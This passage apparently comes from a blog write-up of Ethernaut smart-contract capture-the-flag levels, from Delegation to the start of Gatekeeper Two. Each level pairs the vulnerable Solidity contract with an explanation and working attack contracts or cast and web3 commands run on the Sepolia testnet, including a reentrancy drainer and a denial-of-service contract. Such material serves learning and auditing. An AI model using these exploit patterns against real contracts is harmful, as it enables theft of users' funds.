</span><span>    owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>  }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Delegation </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>address public</span><span> owner;
</span><span>  Delegate delegate;
</span><span>
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>_delegateAddress) {
</span><span>    delegate </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Delegate</span><span>(_delegateAddress);
</span><span>    owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>  }
</span><span>
</span><span>  fallback() </span><span style=color:#81a1c1>external </span><span>{
</span><span>    (</span><span style=color:#81a1c1>bool</span><span> result,) </span><span style=color:#81a1c1>= address</span><span>(delegate).</span><span style=color:#81a1c1>delegatecall</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>data</span><span>);
</span><span>    if (result) {
</span><span>      </span><span style=color:#81a1c1>this</span><span>;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><p>The target is to claim ownership of the contract instance. <a href=https://solidity-by-example.org/delegatecall/>delegatecall</a> is low level function similar to <code>call</code>. but in the process of <code>delegatecall</code> , the function being called indirectly would using the calling function’s memory and <code>msg.sender</code> <code>msg.value</code>. Therefore delegates have complete access to your contract’s state. Referrence to https://www.wtf.academy/en/solidity-advanced/Delegatecall/<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>contract.sendTransaction({data: web3.utils.keccak256("pwn()")})
</span></code></pre><h2 id=force>Force</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Force </span><span>{</span><span style=color:#616e88>/*
</span><span style=color:#616e88>
</span><span style=color:#616e88>                   MEOW ?
</span><span style=color:#616e88>         /\_/\   /
</span><span style=color:#616e88>    ____/ o o \
</span><span style=color:#616e88>  /~____  =ø= /
</span><span style=color:#616e88> (______)__m_m)
</span><span style=color:#616e88>
</span><span style=color:#616e88>*/</span><span>}
</span></code></pre><p>It just a plain contract with none code inside. Even not have a <code>receive</code> or <code>fallback</code> function to recept money.<p>Contracts can get money through the following methods:<ul><li>payable function ( customize / receive / fallback ) and external calling<li>selfdestruct award<li>mining award</ul><p>Apparently in this contract we should call <a href=https://docs.soliditylang.org/en/v0.8.20/introduction-to-smart-contracts.html#deactivate-and-self-destruct>selfdestruct</a> of other contract to force this contract recept money.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Sacrifice </span><span>{
</span><span>
</span><span>    function </span><span style=color:#88c0d0>suicide</span><span>(</span><span style=color:#81a1c1>address payable </span><span>_address) </span><span style=color:#81a1c1>external payable </span><span>{
</span><span>    	</span><span style=color:#81a1c1>selfdestruct</span><span>(_address);
</span><span>    }
</span><span>
</span><span>    receive() </span><span style=color:#81a1c1>external payable </span><span>{ }
</span><span>}
</span></code></pre><p>deploy and call suicide function with value <code>10000 wei</code> would solve this challenge<h2 id=vault>Vault</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Vault </span><span>{
</span><span>  </span><span style=color:#81a1c1>bool public</span><span> locked;
</span><span>  </span><span style=color:#81a1c1>bytes32 private</span><span> password;
</span><span>
</span><span>  constructor(</span><span style=color:#81a1c1>bytes32 </span><span>_password) {
</span><span>    locked </span><span style=color:#81a1c1>= true</span><span>;
</span><span>    password </span><span style=color:#81a1c1>=</span><span> _password;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>unlock</span><span>(</span><span style=color:#81a1c1>bytes32 </span><span>_password) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    if (password </span><span style=color:#81a1c1>==</span><span> _password) {
</span><span>      locked </span><span style=color:#81a1c1>= false</span><span>;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><p>Just get the value of password would solve this challenge. Even though password is declared as private, there is no real private variable in blockchain world. We are able to directly visit the memory of contract. Through easy calculation you would know the password is in the solt with index 1.<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>> await </span><span>web3</span><span style=color:#81a1c1>.</span><span>eth</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getStorageAt</span><span>(contract</span><span style=color:#81a1c1>.</span><span>address</span><span style=color:#eceff4>, </span><span style=color:#b48ead>1</span><span>)
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
</span></code></pre><pre class=language-bash data-lang=bash style=color:#d8dee9;background-color:#2e3440><code class=language-bash data-lang=bash><span style=color:#88c0d0>$</span><span> cast send 0x2aEB3659dae953F1E6479F1080293285575e4426 </span><span style=color:#a3be8c>"unlock(bytes32)"</span><span> -r https://ethereum-sepolia.publicnode.com --private-key </span><span style=color:#81a1c1><</span><span style=color:#b48ead>64</span><span>byteskey</span><span style=color:#81a1c1>> </span><span style=color:#eceff4>-</span><span>- </span><span style=color:#a3be8c>'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
</span><span>
</span><span style=color:#88c0d0>blockHash</span><span>               0xfd32fdacac580b386cfc23eb61e8c3f43e0fd53a933d0e7be00efe457be78173
</span><span style=color:#88c0d0>blockNumber</span><span>             4501800
</span><span style=color:#88c0d0>contractAddress         
</span><span style=color:#88c0d0>cumulativeGasUsed</span><span>       1921303
</span><span style=color:#88c0d0>effectiveGasPrice</span><span>       10926752295
</span><span style=color:#88c0d0>gasUsed</span><span>                 24143
</span><span style=color:#88c0d0>logs                    </span><span style=color:#81a1c1>[]
</span><span style=color:#88c0d0>logsBloom</span><span>               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
</span><span style=color:#88c0d0>root                    
</span><span style=color:#88c0d0>status</span><span>                  1
</span><span style=color:#88c0d0>transactionHash</span><span>         0x4a381bd75ab79e4196104de62c5dc0453d18596260b83b7368ff1689b2d98a76
</span><span style=color:#88c0d0>transactionIndex</span><span>        14
</span><span style=color:#88c0d0>type</span><span>                    2
</span></code></pre><p><em>Foundry Toolkit excellent</em><p>the rpc url above found by https://chainlist.org/chain/11155111<h2 id=king>King</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>King </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>address</span><span> king;
</span><span>  </span><span style=color:#81a1c1>uint public</span><span> prize;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> owner;
</span><span>
</span><span>  constructor() </span><span style=color:#81a1c1>payable </span><span>{
</span><span>    owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;  
</span><span>    king </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>    prize </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>value</span><span>;
</span><span>  }
</span><span>
</span><span>  receive() </span><span style=color:#81a1c1>external payable </span><span>{
</span><span>    require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>value >=</span><span> prize </span><span style=color:#81a1c1>|| msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> owner);
</span><span>    </span><span style=color:#81a1c1>payable</span><span>(king).</span><span style=color:#88c0d0>transfer</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>value</span><span>);
</span><span>    king </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>    prize </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>value</span><span>;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>_king</span><span>() </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>address</span><span>) {
</span><span>    return king;
</span><span>  }
</span><span>}
</span></code></pre><p>In this contract, we can become the new king by paying more than prize, while the owner can become the new king through his identity without paying.<p>In ethereum world, EOA can receive eth at any time, but if the CA haven’t declared the payable function <code>receive()</code> or <code>fallback()</code>, or just actively <code>revert()</code>, the transcation would failed. And it will cause a rollback of the Ethereum state machine with the below code not executed (That is to say, the value of the king variable can no longer be changed). That’s what needed in solving this challenge.<p>check the current prize:<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>> await </span><span>web3</span><span style=color:#81a1c1>.</span><span>eth</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getStorageAt</span><span>(contract</span><span style=color:#81a1c1>.</span><span>address</span><span style=color:#eceff4>, </span><span style=color:#b48ead>1</span><span>)
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0x00000000000000000000000000000000000000000000000000038d7ea4c68000'
</span><span style=color:#81a1c1>> </span><span>(</span><span style=color:#b48ead>0x38d7ea4c68000</span><span>)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>toString</span><span>()</span><span style=color:#81a1c1>.</span><span>length
</span><span style=color:#81a1c1>< </span><span style=color:#b48ead>16
</span></code></pre><p>deploy the following contract with <code>>=0.001 eth</code><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import "./King.sol";
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Newking</span><span>{
</span><span>    King _king;
</span><span>    constructor(</span><span style=color:#81a1c1>address payable </span><span>_address) </span><span style=color:#81a1c1>payable</span><span>{
</span><span>        _king </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>King</span><span>(_address);
</span><span>        </span><span style=color:#81a1c1>address</span><span>(_king).</span><span style=color:#81a1c1>call</span><span>{value: _king.</span><span style=color:#88c0d0>prize</span><span>()}(""); </span><span style=color:#616e88>// triggering the receive() function on King contract with the msg.value as prize
</span><span>    }
</span><span>}
</span></code></pre><h2 id=re-entrance>Re-Entrance</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.6.12</span><span>;
</span><span>
</span><span>import 'openzeppelin-contracts-06/math/SafeMath.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Reentrance </span><span>{
</span><span>  
</span><span>  using SafeMath for </span><span style=color:#81a1c1>uint256</span><span>;
</span><span>  mapping(</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint</span><span>) </span><span style=color:#81a1c1>public</span><span> balances;
</span><span>
</span><span>  function </span><span style=color:#88c0d0>donate</span><span>(</span><span style=color:#81a1c1>address </span><span>_to) </span><span style=color:#81a1c1>public payable </span><span>{
</span><span>    balances[_to] </span><span style=color:#81a1c1>=</span><span> balances[_to].</span><span style=color:#88c0d0>add</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>value</span><span>);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address </span><span>_who) </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>uint</span><span> balance) {
</span><span>    return balances[_who];
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>withdraw</span><span>(</span><span style=color:#81a1c1>uint </span><span>_amount) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    if(balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>>=</span><span> _amount) {
</span><span>      (</span><span style=color:#81a1c1>bool</span><span> result,) </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>.</span><span style=color:#81a1c1>call</span><span>{value:_amount}("");
</span><span>      if(result) {
</span><span>        _amount;
</span><span>      }
</span><span>      balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>-=</span><span> _amount;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  receive() </span><span style=color:#81a1c1>external payable </span><span>{}
</span><span>}
</span></code></pre><p>Classic Reentrance-Attack.<p>In my understanding, Reentrance-Attack is similar to the race-condition attack in web2 application. Due to the contract operating mechanism of Ethereum, if the transaction address in the contract is another contract, the receive or fallback code of that contract will be executed first, and the state machine will not be updated at this moment. The back calling to this victim contract in receive function would bypass the state check.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>> await getBalance(contract.</span><span style=color:#81a1c1>address</span><span>)
</span><span>< 0.001
</span></code></pre><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.6.12</span><span>;
</span><span>
</span><span>import './Reentrance.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Reeentrance </span><span>{
</span><span>
</span><span>    Reentrance _reentrance;
</span><span>    constructor (</span><span style=color:#81a1c1>address payable </span><span>_address) </span><span style=color:#81a1c1>public payable </span><span>{
</span><span>        _reentrance </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Reentrance</span><span>(_address);
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>attack </span><span>() </span><span style=color:#81a1c1>public payable </span><span>{
</span><span>        </span><span style=color:#81a1c1>address</span><span>(_reentrance).</span><span style=color:#81a1c1>call</span><span>{value: </span><span style=color:#b48ead>100000000000000</span><span>}(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodeWithSelector</span><span>(</span><span style=color:#81a1c1>bytes4</span><span>(</span><span style=color:#81a1c1>keccak256</span><span>("donate(address)")), </span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)));
</span><span>        _reentrance.</span><span style=color:#88c0d0>withdraw</span><span>(</span><span style=color:#b48ead>100000000000000</span><span>);
</span><span>    }
</span><span>    receive () </span><span style=color:#81a1c1>external payable </span><span>{
</span><span>        if(</span><span style=color:#81a1c1>address</span><span>(_reentrance).balance </span><span style=color:#81a1c1>> </span><span style=color:#b48ead>0</span><span>) _reentrance.</span><span style=color:#88c0d0>withdraw</span><span>(</span><span style=color:#b48ead>100000000000000</span><span>);
</span><span>    }
</span><span>}
</span></code></pre><p>A word after solving the challenge.<blockquote><p><code>transfer</code> and <code>send</code> are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork <a href=https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/>Source 1</a> <a href=https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742>Source 2</a>.</blockquote><h2 id=elevator>Elevator</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>interface </span><span style=color:#88c0d0>Building </span><span>{
</span><span>  function </span><span style=color:#88c0d0>isLastFloor</span><span>(</span><span style=color:#81a1c1>uint</span><span>) </span><span style=color:#81a1c1>external </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>);
</span><span>}
</span><span>
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Elevator </span><span>{
</span><span>  </span><span style=color:#81a1c1>bool public</span><span> top;
</span><span>  </span><span style=color:#81a1c1>uint public</span><span> floor;
</span><span>
</span><span>  function </span><span style=color:#88c0d0>goTo</span><span>(</span><span style=color:#81a1c1>uint </span><span>_floor) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    Building building </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Building</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>);
</span><span>
</span><span>    if (</span><span style=color:#81a1c1>!</span><span> building.</span><span style=color:#88c0d0>isLastFloor</span><span>(_floor)) {
</span><span>      floor </span><span style=color:#81a1c1>=</span><span> _floor;
</span><span>      top </span><span style=color:#81a1c1>=</span><span> building.</span><span style=color:#88c0d0>isLastFloor</span><span>(floor);
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><p>Contract defined a interface <code>Building</code> and will be Instantiated when <code>goTo</code> function is called.<p>Thats mean <code>msg.sender</code> should be CA, with <code>goTo</code> function meet the interface requirements. And to exploit it we should let <code>isLastFloor</code> return false at first, and true at second time.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import './Elevator.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Hack </span><span>{
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>_instance) {
</span><span>    target </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Elevator</span><span>(_instance);
</span><span>  }
</span><span>  Elevator </span><span style=color:#81a1c1>public </span><span>target;
</span><span>  </span><span style=color:#81a1c1>bool</span><span> result </span><span style=color:#81a1c1>= true</span><span>;
</span><span>  function </span><span style=color:#88c0d0>isLastFloor</span><span>(</span><span style=color:#81a1c1>uint</span><span>) </span><span style=color:#81a1c1>public </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>){
</span><span>    if(result </span><span style=color:#81a1c1>== true</span><span>)
</span><span>    {
</span><span>      result </span><span style=color:#81a1c1>= false</span><span>;
</span><span>    }
</span><span>    else {
</span><span>      result </span><span style=color:#81a1c1>= true</span><span>;
</span><span>    }
</span><span>    return result;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>attack</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>    target.</span><span style=color:#88c0d0>goTo</span><span>(</span><span style=color:#b48ead>10</span><span>);
</span><span>  }
</span><span>}
</span></code></pre><h2 id=privacy>Privacy</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Privacy </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>bool public</span><span> locked </span><span style=color:#81a1c1>= true</span><span>;
</span><span>  </span><span style=color:#81a1c1>uint256 public</span><span> ID </span><span style=color:#81a1c1>= block</span><span>.</span><span style=color:#81a1c1>timestamp</span><span>;
</span><span>  </span><span style=color:#81a1c1>uint8 private</span><span> flattening </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>10</span><span>;
</span><span>  </span><span style=color:#81a1c1>uint8 private</span><span> denomination </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>255</span><span>;
</span><span>  </span><span style=color:#81a1c1>uint16 private</span><span> awkwardness </span><span style=color:#81a1c1>= uint16</span><span>(</span><span style=color:#81a1c1>block</span><span>.</span><span style=color:#81a1c1>timestamp</span><span>);
</span><span>  </span><span style=color:#81a1c1>bytes32</span><span>[</span><span style=color:#b48ead>3</span><span>] </span><span style=color:#81a1c1>private</span><span> data;
</span><span>
</span><span>  constructor(</span><span style=color:#81a1c1>bytes32</span><span>[</span><span style=color:#b48ead>3</span><span>] </span><span style=color:#81a1c1>memory </span><span>_data) {
</span><span>    data </span><span style=color:#81a1c1>=</span><span> _data;
</span><span>  }
</span><span>  
</span><span>  function </span><span style=color:#88c0d0>unlock</span><span>(</span><span style=color:#81a1c1>bytes16 </span><span>_key) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    require(_key </span><span style=color:#81a1c1>== bytes16</span><span>(data[</span><span style=color:#b48ead>2</span><span>]));
</span><span>    locked </span><span style=color:#81a1c1>= false</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#616e88>/*
</span><span style=color:#616e88>    A bunch of super advanced solidity algorithms...
</span><span style=color:#616e88>
</span><span style=color:#616e88>      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
</span><span style=color:#616e88>      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
</span><span style=color:#616e88>      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
</span><span style=color:#616e88>      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
</span><span style=color:#616e88>      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
</span><span style=color:#616e88>  */
</span><span>}
</span></code></pre><p>Still, there is not real “private” variable in ethereum. Even the memory of contract could be view by given API of web3.js.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>> (await web3.eth.</span><span style=color:#88c0d0>getStorageAt</span><span>(contract.</span><span style=color:#81a1c1>address</span><span>, </span><span style=color:#b48ead>5</span><span>))
</span><span>< '0x1603c85b3f007519d352444d1eee059b52fbf7c375579129a1903cead8e3ca82'
</span></code></pre><pre class=language-bash data-lang=bash style=color:#d8dee9;background-color:#2e3440><code class=language-bash data-lang=bash><span style=color:#88c0d0>$</span><span> cast call 0x34a17DfF1f3CCde4d2948c58658993D9F0320050 </span><span style=color:#a3be8c>"unlock(bytes16)"</span><span> -r wss://ethereum-sepolia.publicnode.com --private-key </span><span style=color:#81a1c1><</span><span>REDACTED</span><span style=color:#81a1c1>> </span><span style=color:#eceff4>-</span><span>- 0x1603c85b3f007519d352444d1eee059b -f
</span><span style=color:#88c0d0>0x
</span></code></pre><p><del>I didn’t know why it output <code>0x</code>. but it actually be worked.（x</del><h2 id=gatekeeper-one>Gatekeeper One</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>GatekeeperOne </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>address public</span><span> entrant;
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateOne</span><span>() {
</span><span>    require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender != tx</span><span>.</span><span style=color:#81a1c1>origin</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateTwo</span><span>() {
</span><span>    require(</span><span style=color:#81a1c1>gasleft</span><span>() </span><span style=color:#81a1c1>% </span><span style=color:#b48ead>8191 </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>0</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateThree</span><span>(</span><span style=color:#81a1c1>bytes8 </span><span>_gateKey) {
</span><span>      require(</span><span style=color:#81a1c1>uint32</span><span>(</span><span style=color:#81a1c1>uint64</span><span>(_gateKey)) </span><span style=color:#81a1c1>== uint16</span><span>(</span><span style=color:#81a1c1>uint64</span><span>(_gateKey)), "GatekeeperOne: invalid gateThree part one");
</span><span>      require(</span><span style=color:#81a1c1>uint32</span><span>(</span><span style=color:#81a1c1>uint64</span><span>(_gateKey)) </span><span style=color:#81a1c1>!= uint64</span><span>(_gateKey), "GatekeeperOne: invalid gateThree part two");
</span><span>      require(</span><span style=color:#81a1c1>uint32</span><span>(</span><span style=color:#81a1c1>uint64</span><span>(_gateKey)) </span><span style=color:#81a1c1>== uint16</span><span>(</span><span style=color:#81a1c1>uint160</span><span>(</span><span style=color:#81a1c1>tx</span><span>.</span><span style=color:#81a1c1>origin</span><span>)), "GatekeeperOne: invalid gateThree part three");
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>enter</span><span>(</span><span style=color:#81a1c1>bytes8 </span><span>_gateKey) </span><span style=color:#81a1c1>public gateOne gateTwo gateThree</span><span>(_gateKey) returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>    entrant </span><span style=color:#81a1c1>= tx</span><span>.</span><span style=color:#81a1c1>origin</span><span>;
</span><span>    return </span><span style=color:#81a1c1>true</span><span>;
</span><span>  }
</span><span>}
</span></code></pre><p>This challenge need us to pass three check of modifier.<ul><li>gateOne: just the previous challenge <code>Telephone</code><li>gateTwo: gas remaining required to be an integer multiple of 10. Brute force with some meaningless code could pass this.<li>gateThree: three requirements to <code>_gateKey</code> param: <ul><li><p><code>_gateKey[4:7]</code> == <code>_gateKey[6:7]</code> (<code>_gate[4:5]</code> == <code>0x0000</code>)</p><li><p><code>_gateKey[4:7]</code> != <code>_gateKey[0:7]</code>(<code>_gateKey[0:3]</code> != <code>0x00000000</code>)</p><li><p><code>_gateKey[4:7]</code> == <code>tx.origin[28:29]</code>(<code>_gateKey[4:5]</code>== <code>0x0000</code> && <code>_gateKey[6:7]</code> == <code>tx.origin[28:29]</code>)</p></ul></ul><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.6.0</span><span>;
</span><span>
</span><span>import "./chall/GatekeeperOne.sol";
</span><span>
</span><span>contract </span><span style=color:#88c0d0>exp </span><span>{
</span><span>
</span><span>    GatekeeperOne level13 </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>GatekeeperOne</span><span>(</span><span style=color:#b48ead>0xF4F13D94A1c5A8e51DED1692171bC67260289E5E</span><span>);
</span><span>
</span><span>    function </span><span style=color:#88c0d0>exploit</span><span>() </span><span style=color:#81a1c1>external</span><span>{
</span><span>        </span><span style=color:#81a1c1>bytes8</span><span> _gateKey </span><span style=color:#81a1c1>= bytes8</span><span>(</span><span style=color:#81a1c1>uint64</span><span>(</span><span style=color:#81a1c1>tx</span><span>.</span><span style=color:#81a1c1>origin</span><span>)) </span><span style=color:#81a1c1>& </span><span style=color:#b48ead>0xFFFFFFFF0000FFFF</span><span>;
</span><span>        for (</span><span style=color:#81a1c1>uint256</span><span> i </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0</span><span>; i </span><span style=color:#81a1c1>< </span><span style=color:#b48ead>300</span><span>; i</span><span style=color:#81a1c1>++</span><span>) {
</span><span>            (</span><span style=color:#81a1c1>bool</span><span> success, ) </span><span style=color:#81a1c1>= address</span><span>(level13).</span><span style=color:#81a1c1>call</span><span>{gas: i </span><span style=color:#81a1c1>+ </span><span>(</span><span style=color:#b48ead>8191 </span><span style=color:#81a1c1>* </span><span style=color:#b48ead>3</span><span>)}(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodeWithSignature</span><span>("enter(bytes8)", _gateKey));
</span><span>            if (success) {
</span><span>                break;
</span><span>            }
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><p><em>solidity changes so fast… only found 0.6.3 could compile this(with <code>Explicit type conversion</code> and <code>lower level call{}()</code> )</em><h2 id=gatekeeper-two>GateKeeper Two</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>GatekeeperTwo </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>address public</span><span> entrant;
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateOne</span><span>() {
</span><span>    require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender != tx</span><span>.</span><span style=color:#81a1c1>origin</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateTwo</span><span>() {
</span><span>    </span><span style=color:#81a1c1>uint</span><span> x;
</span><span>    assembly { x := </span><span style=color:#88c0d0>extcodesize</span><span>(</span><span style=color:#88c0d0>caller</span><span>()) }
</span><span>    require(x </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>0</span><span>);
</span><span>    _;
